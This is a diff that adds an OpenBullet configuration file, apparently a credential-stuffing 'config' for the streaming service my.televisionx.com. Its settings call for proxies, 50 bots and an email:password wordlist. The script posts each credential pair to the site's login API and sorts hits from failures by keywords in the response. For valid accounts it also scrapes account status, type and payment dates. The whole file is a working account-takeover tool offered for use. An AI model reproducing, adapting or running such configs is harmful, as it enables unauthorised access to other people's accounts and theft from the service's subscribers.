@@ -1,0 +1,55 @@
+[SETTINGS]
+{
+  "Name": "TelevisionX",
+  "SuggestedBots": 50,
+  "LastModified": "2018-05-23T19:03:54.3272484+00:00",
+  "AdditionalInfo": "",
+  "Author": "Ruri",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#LOGIN REQUEST POST "https://my.televisionx.com/api/v1/login/makeNewLoginSession" AutoRedirect=TRUE 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "origin: https://my.televisionx.com" 
+  HEADER "referer: https://my.televisionx.com/login.php" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "FirstName" 
+    KEY "account_active" 
+  KEYCHAIN Failure OR 
+    KEY "NO_USER" 
+    KEY "invalid_password" 
+    KEY "<RESPONSECODE>" Contains "500" 
+#GET_INFO REQUEST POST "https://my.televisionx.com/api/v1/login/viewLoggedUserDetails" AutoRedirect=TRUE 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "origin: https://my.televisionx.com" 
+  HEADER "referer: https://my.televisionx.com/login.php" 
+#CAPTURE_ACTIVE PARSE "<SOURCE>" LR "\",\"Active\":\"" "\",\"RegisteredDate" Recursive=FALSE -> CAP "Active" "" "" 
+#CAPTURE_REGISTERED PARSE "<SOURCE>" LR "\",\"RegisteredDate\":\"" "\"" Recursive=FALSE -> CAP "Registered" "" "" 
+#CAPTURE_TYPE PARSE "<SOURCE>" LR ",\"Type\":\"" "\",\"Active\":\"" Recursive=FALSE -> CAP "Type" "" "" 
+#CAPTURE_FIRST_PAYMENT PARSE "<SOURCE>" LR ",\"FirstPaymentDate\":\"" "\"" Recursive=FALSE -> CAP "First Payment" "" "" 
+#CAPTURE_LAST_PAYMENT PARSE "<SOURCE>" LR ",\"LastPaymentDate\":\"" "\"" Recursive=FALSE -> CAP "Last Payment" "" "" 
+#CAPTURE_NEXT_PAYMENT PARSE "<SOURCE>" LR ",\"NextPaymentDate\":\"" "\"" Recursive=FALSE -> CAP "Next Payment" "" "" 
